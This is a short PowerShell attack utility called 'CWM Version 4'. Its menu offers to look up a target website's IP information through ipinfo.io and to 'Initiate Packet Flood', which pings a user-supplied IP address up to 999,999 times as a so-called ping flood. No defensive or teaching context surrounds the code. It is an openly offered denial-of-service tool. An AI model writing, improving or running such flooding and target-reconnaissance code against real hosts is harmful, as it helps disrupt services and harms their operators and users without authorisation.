function Show-Menu
{
    Clear-Host
    Write-Host "▁▂▃▅▆█ CWM Version 4 █▆▅▃▂▁" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "[1] Resolve Webserver Information" -ForegroundColor Cyan
    Write-Host "[2] Initiate Packet Flood" -ForegroundColor Cyan
    Write-Host "[Q] Close utility" -ForegroundColor Cyan
}
Show-Menu
 $selection = Read-Host "Please make a selection"
 switch ($selection)
 {
     '1' {
     $targetDomain = Read-Host -Prompt "Enter Targeted Website"
if ($targetDomain -match "[\/\:]") {
    Write-Host "Syntax error:Remove trailing data and HTTP(S) header" -ForegroundColor Red -BackgroundColor Black
    } else {

    if ($targetDomain -notmatch "^(?:(?:1?[1-9]?\d|[12][0-4]\d|25[0-5])(?:\.(?!$)|$)){4}$") {
        $targetIP = Resolve-DnsName $targetDomain | ForEach-Object IP4Address | Select-Object -First 1
        Invoke-RestMethod "https://ipinfo.io/$targetIP"
        } else {
Invoke-RestMethod "https://ipinfo.io/$targetDomain" }
}
     } '2' {
         $target = Read-Host -Prompt "Enter target IP address. (v4 and v6 supported)"
         Write-Host "Pingflood is in operation. Press CTRL+C to stop" -ForegroundColor Yellow
         Test-Connection $target -Count 999999 -Delay 1 
     } '3' {
         'Undefined option : 3 (maybe in CWMv5?)'
     } 'q' {
         return
     }
 }